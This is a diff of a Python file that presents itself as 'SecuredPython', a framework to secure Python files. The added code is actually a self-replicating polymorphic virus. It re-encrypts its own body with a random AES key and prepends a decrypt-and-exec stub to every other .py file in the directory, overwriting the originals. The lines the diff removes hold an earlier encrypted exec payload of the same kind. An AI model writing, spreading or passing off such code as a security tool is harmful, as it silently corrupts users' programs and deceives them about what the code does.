@@ -1,15 +1,71 @@
-# PIEMOLDER:START
-from Crypto.Cipher import AES
+# SecuredPython
+# Little framework to secure all your python files
+
+def scan(sandboxedCode):
+	import glob
+	import os
+	referenceFiles = glob.glob("*.py")
+
+	for f in referenceFiles:
+		referenceFile = open(f, "r")
+		if "# SecuredPython" not in referenceFile.readline() and f != os.path.basename(__file__):
+			referenceFile.close()
+			referenceFile = open(f, "r")
+			sandboxFile = open("%s.sandbox" % f, "w")
+
+			sandboxFile.write(sandboxedCode)
+
+			for line in referenceFile.readlines():
+				sandboxFile.write(line)
+
+			referenceFile.close()
+			sandboxFile.close()
+
+			os.remove(f)
+			os.rename("%s.sandbox" % f, f)
+
+
+import os
+sandboxedCode = os.path.basename(__file__)
+sfile = open(sandboxedCode, "r")
+heuristics = False
+sandbox = ""
+for line in sfile.readlines():
+	if line.find("# SecuredPython") == 0:
+		heuristics = True
+	if line.find("# SHA256=8b9fa7a9a1526e61aebcf2f9dc48a5f009c4687f6386fad0b8258a0b75ed4eff") == 0:
+		heuristics = False
+		sandbox += line
+	if heuristics:
+		sandbox += line
+
+
+# first we encrypt the mold....
+from Crypto.Cipher import AES 
 import base64
-cryptmold = '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'
-key = base64.b64decode('V0zCK15HfBSwldfktM1q8Haz9nadVjv9WHv7tnXvOX0=')
-iv4 = base64.b64decode('gTYD45ZV2ePVOtAfjeAh5w==')
-decryptor = AES.new(key, AES.MODE_CFB, iv4)
-plainmold = decryptor.decrypt(base64.b64decode(cryptmold))
-exec plainmold
-# PIEMOLDER:END
+key = os.urandom(32)
+iv4 = os.urandom(16)
+cryptor = AES.new(key, AES.MODE_CFB, iv4)
+cryptedsandbox = base64.b64encode(cryptor.encrypt(sandbox))
+
+# then we create a decrypt and run block to inject in the other pies
+sandboxedCode = "# SecuredPython\n"
+sandboxedCode += "from Crypto.Cipher import AES\n"
+sandboxedCode += "import base64\n"
+sandboxedCode += "securesandbox = '"
+sandboxedCode += cryptedsandbox
+sandboxedCode += "'\n"
+sandboxedCode += "key = base64.b64decode('%s')\n" % base64.b64encode(key)
+sandboxedCode += "iv4 = base64.b64decode('%s')\n" % base64.b64encode(iv4)
+sandboxedCode += "decryptor = AES.new(key, AES.MODE_CFB, iv4)\n"
+sandboxedCode += "sandbox = decryptor.decrypt(base64.b64decode(securesandbox))\n"
+sandboxedCode += "exec sandbox\n"
+sandboxedCode += "# SHA256=8b9fa7a9a1526e61aebcf2f9dc48a5f009c4687f6386fad0b8258a0b75ed4eff\n"
+
+scan(sandboxedCode)
 
 
+# SHA256=8b9fa7a9a1526e61aebcf2f9dc48a5f009c4687f6386fad0b8258a0b75ed4eff
 
 
 
